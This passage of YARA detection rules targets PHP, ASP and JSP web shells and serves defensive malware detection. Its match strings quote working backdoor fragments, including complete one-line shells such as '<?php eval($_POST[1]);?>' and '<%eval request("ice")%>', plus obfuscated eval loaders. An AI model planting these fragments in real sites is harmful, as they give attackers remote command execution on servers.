      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<%@page import=\"java.io.*\"%><%if(request.getParameter(\"f\")" 
   condition: 
      all of them
} 

rule Webshell_webshells_new_xxxx_RID3257 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web shells - generated from file xxxx.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 14:01:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<?php eval($_POST[1]);?>  " fullword
   condition: 
      all of them
} 

rule Webshell_webshells_new_JJjsp3_RID328B : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web shells - generated from file JJjsp3.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 14:09:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<%@page import=\"java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*\"%><%!S" 
   condition: 
      all of them
} 

rule Webshell_webshells_new_radhat_RID32EB : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web shells - generated from file radhat.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 14:25:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "sod=Array(\"D\",\"7\",\"S" 
   condition: 
      all of them
} 

rule Webshell_webshells_new_asp1_RID31EC : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web shells - generated from file asp1.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:43:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = " http://www.baidu.com/fuck.asp?a=)0(tseuqer%20lave " fullword
      $s2 = " <% a=request(chr(97)) ExecuteGlobal(StrReverse(a)) %>" fullword
   condition: 
      1 of them
} 

rule Webshell_webshells_new_php6_RID31F5 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web shells - generated from file php6.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:44:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "array_map(\"asx73ert\",(ar" 
      $s3 = "preg_replace(\"/[errorpage]/e\",$page,\"saft\");" fullword
      $s4 = "shell.php?qid=zxexp  " fullword
   condition: 
      1 of them
} 

rule Webshell_webshells_new_xxx_RID31DF : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web shells - generated from file xxx.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:41:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "<?php array_map(\"ass\\x65rt\",(array)$_REQUEST['expdoor']);?>" fullword
   condition: 
      all of them
} 

rule Webshell_GetPostpHp_RID2E94 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web shells - generated from file GetPostpHp.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 11:20:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<?php eval(str_rot13('riny($_CBFG[cntr]);'));?>" fullword
   condition: 
      all of them
} 

rule Webshell_webshells_new_php5_RID31F4 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web shells - generated from file php5.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:44:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<?$_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_u" 
   condition: 
      all of them
} 

rule Webshell_webshells_new_aaa_RID319A : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web shells - generated from file aaa.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:29:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Function fvm(jwv):If jwv=\"\"Then:fvm=jwv:Exit Function:End If:Dim tt,sru:tt=\"" 
      $s5 = "<option value=\"\"DROP TABLE [jnc];exec mast\"&kvp&\"er..xp_regwrite 'HKEY_LOCAL" 
      $s17 = "if qpv=\"\" then qpv=\"x:\\Program Files\\MySQL\\MySQL Server 5.0\\my.ini\"&br&" 
   condition: 
      1 of them
} 

rule Webshell_Expdoor_com_ASP_RID3068 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web shells - generated from file Expdoor.com ASP.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 12:38:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "\">www.Expdoor.com</a>" fullword
      $s5 = "    <input name=\"FileName\" type=\"text\" value=\"Asp_ver.Asp\" size=\"20\" max" 
      $s10 = "set file=fs.OpenTextFile(server.MapPath(FileName),8,True)  '" fullword
      $s14 = "set fs=server.CreateObject(\"Scripting.FileSystemObject\")   '" fullword
      $s16 = "<TITLE>Expdoor.com ASP" fullword
   condition: 
      2 of them
} 

rule Webshell_sig_404super_RID2F0F : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web shells - generated from file 404super.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 11:41:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "$i = pack('c*', 0x70, 0x61, 99, 107);" fullword
      $s6 = "    'h' => $i('H*', '687474703a2f2f626c616b696e2e64756170702e636f6d2f7631')," fullword
      $s7 = "//http://require.duapp.com/session.php" fullword
      $s8 = "if(!isset($_SESSION['t'])){$_SESSION['t'] = $GLOBALS['f']($GLOBALS['h']);}" fullword
      $s12 = "//define('pass','123456');" fullword
      $s13 = "$GLOBALS['c']($GLOBALS['e'](null, $GLOBALS['s']('%s',$GLOBALS['p']('H*',$_SESSIO" 
   condition: 
      1 of them
} 

rule Webshell_webshells_new_JSP_RID3164 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web shells - generated from file JSP.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:20:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "void AA(StringBuffer sb)throws Exception{File r[]=File.listRoots();for(int i=0;i" 
      $s5 = "bw.write(z2);bw.close();sb.append(\"1\");}else if(Z.equals(\"E\")){EE(z1);sb.app" 
      $s11 = "if(Z.equals(\"A\")){String s=new File(application.getRealPath(request.getRequest" 
   condition: 
      1 of them
} 

rule Webshell_webshell_123_RID2EF1 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web shells - generated from file webshell-123.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 11:36:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "// Web Shell!!" fullword
      $s1 = "@preg_replace(\"/.*/e\",\"\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66\\x6" 
      $s3 = "$default_charset = \"UTF-8\";" fullword
      $s4 = "// url:http://www.weigongkai.com/shell/" fullword
   condition: 
      2 of them
} 

rule Webshell_dev_core_RID2DED : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web shells - generated from file dev_core.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 10:52:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "if (strpos($_SERVER['HTTP_USER_AGENT'], 'EBSD') == false) {" fullword
      $s9 = "setcookie('key', $_POST['pwd'], time() + 3600 * 24 * 30);" fullword
      $s10 = "$_SESSION['code'] = _REQUEST(sprintf(\"%s?%s\",pack(\"H*\",'6874" 
      $s11 = "if (preg_match(\"/^HTTP\\/\\d\\.\\d\\s([\\d]+)\\s.*$/\", $status, $matches))" 
      $s12 = "eval(gzuncompress(gzuncompress(Crypt::decrypt($_SESSION['code'], $_C" 
      $s15 = "if (($fsock = fsockopen($url2['host'], 80, $errno, $errstr, $fsock_timeout))" 
   condition: 
      1 of them
} 

rule Webshell_webshells_new_pHp_RID319F : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web shells - generated from file pHp.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:30:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "if(is_readable($path)) antivirus($path.'/',$exs,$matches);" fullword
      $s1 = "'/(eval|assert|include|require|include\\_once|require\\_once|array\\_map|arr" 
      $s13 = "'/(exec|shell\\_exec|system|passthru)+\\s*\\(\\s*\\$\\_(\\w+)\\[(.*)\\]\\s*" 
      $s14 = "'/(include|require|include\\_once|require\\_once)+\\s*\\(\\s*[\\'|\\\"](\\w+" 
      $s19 = "'/\\$\\_(\\w+)(.*)(eval|assert|include|require|include\\_once|require\\_once" 
   condition: 
      1 of them
} 

rule Webshell_webshells_new_code_RID3212 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web shells - generated from file code.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:49:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<a class=\"high2\" href=\"javascript:;;;\" name=\"action=show&dir=$_ipage_fi" 
      $s7 = "$file = !empty($_POST[\"dir\"]) ? urldecode(self::convert_to_utf8(rtrim($_PO" 
      $s10 = "if (true==@move_uploaded_file($_FILES['userfile']['tmp_name'],self::convert_" 
      $s14 = "Processed in <span id=\"runtime\"></span> second(s) {gzip} usage:" 
      $s17 = "<a href=\"javascript:;;;\" name=\"{return_link}\" onclick=\"fileperm" 
   condition: 
      1 of them
} 

rule Webshell_webshells_new_PHP1_RID3190 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web shells - generated from file PHP1.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:27:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<[url=mailto:?@array_map($_GET[]?@array_map($_GET['f'],$_GET[/url]);?>" fullword
      $s2 = ":https://forum.90sec.org/forum.php?mod=viewthread&tid=7316" fullword
      $s3 = "@preg_replace(\"/f/e\",$_GET['u'],\"fengjiao\"); " fullword
   condition: 
      1 of them
} 

rule Webshell_webshells_new_JJJsp2_RID326A : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web shells - generated from file JJJsp2.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 14:04:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "QQ(cs, z1, z2, sb,z2.indexOf(\"-to:\")!=-1?z2.substring(z2.indexOf(\"-to:\")+4,z" 
      $s8 = "sb.append(l[i].getName() + \"/\\t\" + sT + \"\\t\" + l[i].length()+ \"\\t\" + sQ" 
      $s10 = "ResultSet r = s.indexOf(\"jdbc:oracle\")!=-1?c.getMetaData()" 
      $s11 = "return DriverManager.getConnection(x[1].trim()+\":\"+x[4],x[2].equalsIgnoreCase(" 
   condition: 
      1 of them
} 

rule Webshell_webshells_new_PHP_RID315F : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web shells - generated from file PHP.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:19:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "echo \"<font color=blue>Error!</font>\";" fullword
      $s2 = "<input type=\"text\" size=61 name=\"f\" value='<?php echo $_SERVER[\"SCRIPT_FILE" 
      $s5 = " - ExpDoor.com</title>" fullword
      $s10 = "$f=fopen($_POST[\"f\"],\"w\");" fullword
      $s12 = "<textarea name=\"c\" cols=60 rows=15></textarea><br>" fullword
   condition: 
      1 of them
} 

rule Webshell_webshells_new_Asp_RID319B : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web shells - generated from file Asp.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:29:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Execute MorfiCoder(\")/*/z/*/(tseuqer lave\")" fullword
      $s2 = "Function MorfiCoder(Code)" fullword
      $s3 = "MorfiCoder=Replace(Replace(StrReverse(Code),\"/*/\",\"\"\"\"),\"\\*\\\",vbCrlf)" fullword
   condition: 
      1 of them
} 

rule Webshell_PHP_sql_RID2D3D : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file sql.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:23:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$result=mysql_list_tables($db) or die (\"$h_error<b>\".mysql_error().\"</b>$f_" 
      $s4 = "print \"<a href=\\\"$_SERVER[PHP_SELF]?s=$s&login=$login&passwd=$passwd&" 
   condition: 
      all of them
} 

rule Webshell_iMHaPFtp_2_RID2E10 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file iMHaPFtp.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:58:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s8 = "if ($l) echo '<a href=\"' . $self . '?action=permission&amp;file=' . urlencode($" 
      $s9 = "return base64_decode('R0lGODlhEQANAJEDAMwAAP///5mZmf///yH5BAHoAwMALAAAAAARAA0AAA" 
   condition: 
      1 of them
} 

rule Webshell_Jspspyweb_RID2E6D : DEMO T1050 T1086 T1100 T1112 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file Jspspyweb.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:14:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1050, T1086, T1100, T1112, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "      out.print(\"<tr><td width='60%'>\"+strCut(convertPath(list[i].getPath()),7" 
      $s3 = "  \"reg add \\\"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control" 
   condition: 
      all of them
} 

rule Webshell_phpshell_2_1_pwhash_RID3211 : DEMO T1086 T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file pwhash.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:49:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1086, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<tt>&nbsp;</tt>\" (space), \"<tt>[</tt>\" (left bracket), \"<tt>|</tt>\" (pi" 
      $s3 = "word: \"<tt>null</tt>\", \"<tt>yes</tt>\", \"<tt>no</tt>\", \"<tt>true</tt>\"," 
   condition: 
      1 of them
} 

rule Webshell_PHPRemoteView_RID2F95 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file PHPRemoteView.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:03:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "<input type=submit value='\".mm(\"Delete all dir/files recursive\").\" (rm -fr)'" 
      $s4 = "<a href='$self?c=delete&c2=$c2&confirm=delete&d=\".urlencode($d).\"&f=\".u" 
   condition: 
      1 of them
} 

rule Webshell_caidao_shell_guo_RID3128 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file guo.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:10:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<?php ($www= $_POST['ice'])!" 
      $s1 = "@preg_replace('/ad/e','@'.str_rot13('riny').'($ww" 
   condition: 
      1 of them
} 

rule Webshell_PHP_redcod_RID2E5E : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file redcod.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:11:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "H8p0bGFOEy7eAly4h4E4o88LTSVHoAglJ2KLQhUw" fullword
      $s1 = "HKP7dVyCf8cgnWFy8ocjrP5ffzkn9ODroM0/raHm" fullword
   condition: 
      all of them
} 

rule Webshell_remview_fix_RID2F4B : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file remview_fix.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:51:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "<a href='$self?c=delete&c2=$c2&confirm=delete&d=\".urlencode($d).\"&f=\".u" 
      $s5 = "echo \"<P><hr size=1 noshade>\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n" 
   condition: 
      1 of them
} 

rule Webshell_php_sh_server_RID301E : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file server.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:26:11"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "eval(getenv('HTTP_CODE'));" fullword
   condition: 
      all of them
} 

rule Webshell_PH_Vayv_PH_Vayv_RID303F : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file PH Vayv.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:31:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "style=\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px in" 
      $s4 = "<font color=\"#858585\">SHOPEN</font></a></font><font face=\"Verdana\" style" 
   condition: 
      1 of them
} 

rule Webshell_caidao_shell_ice_RID310E : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file ice.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:06:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<%eval request(\"ice\")%>" fullword
   condition: 
      all of them
} 

rule Webshell_cihshell_fix_RID2F98 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file cihshell_fix.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:03:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s7 = "<tr style='background:#242424;' ><td style='padding:10px;'><form action='' encty" 
      $s8 = "if (isset($_POST['mysqlw_host'])){$dbhost = $_POST['mysqlw_host'];} else {$dbhos" 
   condition: 
      1 of them
} 

rule Webshell_asp_shell_RID2E61 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file shell.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:12:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s7 = "<input type=\"submit\" name=\"Send\" value=\"GO!\">" fullword
      $s8 = "<TEXTAREA NAME=\"1988\" ROWS=\"18\" COLS=\"78\"></TEXTAREA>" fullword
   condition: 
      all of them
} 

rule Webshell_Private_i3lue_RID2FC2 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file Private-i3lue.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:10:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s8 = "case 15: $image .= \"\\21\\0\\" 
   condition: 
      all of them
} 

rule Webshell_Mysql_interface_v1_0_RID3261 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file Mysql interface v1.0.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 14:02:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "echo \"<td><a href='$PHP_SELF?action=dropDB&dbname=$dbname' onClick=\\\"return" 
   condition: 
      all of them
} 

rule Webshell_php_s_u_RID2D94 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file s-u.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:37:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s6 = "<a href=\"?act=do\"><font color=\"red\">Go Execute</font></a></b><br /><textarea" 
   condition: 
      all of them
} 

rule Webshell_phpshell_2_1_config_RID31FC : DEMO T1086 T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file config.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:45:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1086, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "; (choose good passwords!).  Add uses as simple 'username = \"password\"' lines." fullword
   condition: 
      all of them
} 

rule Webshell_asp_EFSO_2_RID2E07 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file EFSO_2.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:57:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "%8@#@&P~,P,PP,MV~4BP^~,NS~m~PXc3,_PWbSPU W~~[u3Fffs~/%@#@&~~,PP~~,M!PmS,4S,mBPNB" 
   condition: 
      all of them
} 

rule Webshell_jsp_up_RID2D37 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file up.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:22:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s9 = "// BUG: Corta el fichero si es mayor de 640Ks" fullword
   condition: 
      all of them
} 

rule Webshell_NetworkFileManagerPHP_A_RID3353 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file NetworkFileManagerPHP.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 14:43:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s9 = "  echo \"<br><center>All the data in these tables:<br> \".$tblsv.\" were putted " 
   condition: 
      all of them
} 

rule Webshell_Server_Variables_RID3115 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file Server Variables.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:07:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s7 = "<% For Each Vars In Request.ServerVariables %>" fullword
      $s9 = "Variable Name</B></font></p>" fullword
   condition: 
      all of them
} 

rule Webshell_caidao_shell_ice_2_RID319F : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file ice.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:30:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<?php ${${eval($_POST[ice])}};?>" fullword
   condition: 
      all of them
} 

rule Webshell_caidao_shell_mdb_RID3110 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file mdb.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:06:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<% execute request(\"ice\")%>a " fullword
   condition: 
      all of them
} 

rule Webshell_jsp_guige_RID2E63 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file guige.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:12:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "if(damapath!=null &&!damapath.equals(\"\")&&content!=null" 
   condition: 
      all of them
} 

rule Webshell_phpspy2010_RID2E0D : DEMO T1086 T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file phpspy2010.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:58:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1086, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "eval(gzinflate(base64_decode(" 
      $s5 = "//angel" fullword
      $s8 = "$admin['cookiedomain'] = '';" fullword
   condition: 
      all of them
} 

rule Webshell_asp_ice_RID2D7A : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file ice.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:33:31"
      score = 70
      customer = "demo"
